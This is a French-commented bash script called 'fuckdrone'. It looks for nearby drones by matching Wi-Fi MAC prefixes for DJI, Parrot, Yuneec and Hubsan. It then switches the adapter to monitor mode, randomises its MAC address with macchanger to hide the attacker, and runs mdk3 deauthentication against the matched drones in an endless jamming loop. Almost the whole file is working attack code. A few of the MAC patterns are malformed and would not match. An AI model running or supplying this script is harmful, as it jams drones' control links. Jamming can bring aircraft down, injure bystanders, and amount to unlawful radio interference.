#!/bin/bash

echo "";
echo "                  	            @@@@ 			              ";
echo "   Script name : fuckdrone            (&@@                                      ";
echo "   Script by C0yotenoir               @@@@                                      ";
echo "   inspired by Neo                    @@@&                                      ";
echo "   Date:01/05/2020                    @@@@                                      ";
echo "   Version:V.1.0                      @@&&#                                     ";
echo "   interface Wifi :wlan0             @@@@@@*                                    ";
echo "                                  @&@@@@@@@@&@%                                 ";
echo "                              &&&@@&@@&@@@@&@&@@&@/                             ";
echo "                          /@&@@&@@.   @@@&    /@@@@@&@.                         ";
echo "                       @&@@@@@        @@@@        *@@@@@@@                      ";
echo "                   &@&@@@@            @@@@            ,@@@@@@%                  ";
echo "               /&&@@@@                @@@@                ,@&@&&&*              ";
echo "           .@@&@@@ .@@@@&&            @@@@.            #@@@@@. @&@@@@           ";
echo "        @@@@&@         .@@@@@@        @@@@        .@@@&@@          @@@&@@       ";
echo "    @@@&@@                  @@@&@@/   @@@&.   &@@&@&@                  @&&@@&   ";
echo "  &@@%                          &&@@@@@@@&@@@@@@%                          %@@( ";
echo "                                    %@@@@@@@/                                   ";
echo " Script compatible for drone : DJI, Yuneec, Hubsan , Parrot           ";

##NOTES###



#Etape 0
# Votre Reseau

arp -a

## Purge des fichiers

> /tmp/recherche_de_perihperiques.txt ;

> /tmp/adressemacdead.txt ;

#Etape 1
# Scan des peripheriques aux alentour

nmcli -f BSSID dev wifi list | sed '1d' >> /tmp/recherche_de_perihperiques.txt ;

echo "Voici le fichier avec les adresses mac autour de vous ..." ;
echo "";
echo "=====================================";
echo "/tmp/recherche_de_perihperiques.txt";
echo "=====================================";
echo "";


# Comparaison des adresses mac trouvés et des adresses mac de drones

## Drone DJI

 grep -E '^60:60:1F:' /tmp/recherche_de_perihperiques.txt >> /tmp/adressemacdead.txt ;
 grep -E '^34:D2:62:' /tmp/recherche_de_perihperiques.txt >> /tmp/adressemacdead.txt ;

## Drone Parrot

 grep -E '^90:3A:E6:' /tmp/recherche_de_perihperiques.txt >> /tmp/adressemacdead.txt ;
 grep -E '^00:12:1C:' /tmp/recherche_de_perihperiques.txt >> /tmp/adressemacdead.txt ;
 grep -E '^90:03:B7:' /tmp/recherche_de_perihperiques.txt >> /tmp/adressemacdead.txt ;
 grep -E '^A0:14:3D:' /tmp/recherche_de_perihperiques.txt >> /tmp/adressemacdead.txt ;
 grep -E '^00:26:7E:' /tmp/recherche_de_perihperiques.txt >> /tmp/adressemacdead.txt ;

## Drone Yuneec International
grep -E '^E0B6F58' /tmp/recherche_de_perihperiques.txt >> /tmp/adressemacdead.txt ;

## Drone Hubsan
grep -E '^98AAFC7' /tmp/recherche_de_perihperiques.txt >> /tmp/adressemacdead.txt ;


# Modification de la carte wifi : wlan0

echo "check kill en cours" ;

airmon-ng check kill ;

echo " Arret de l interface wlan0 : OK ";

airmon-ng stop wlan0  ;

echo " Demarrage de l interface wlan0 : OK ";
echo " Passage du Mode Monitor sur l interface wlan0mon : OK ";

airmon-ng  start wlan0 ;


echo " Arret de la carte Wifi :wlan0mon : OK";

ifconfig wlan0mon down ;

echo "Demarrage de macchanger : OK ";

macchanger -r wlan0mon ;

echo " Demarrage de la carte : OK ";

ifconfig wlan0mon up ;


echo "Deconnexion de(s) peripherique(s) trouve(s)" ;
echo "" ;

cat /tmp/adressemacdead.txt

#Boucle While pour generer la linfini  le brouillage

while true
do
echo "Brouillage en cours" ;
mdk3 wlan0mon -d -w /tmp/adressemacdead.txt ;

done

echo "";
echo "Arret de l interface moniteur" ;
airmon-ng stop wlan0mon ;


echo " Script Termine" ;




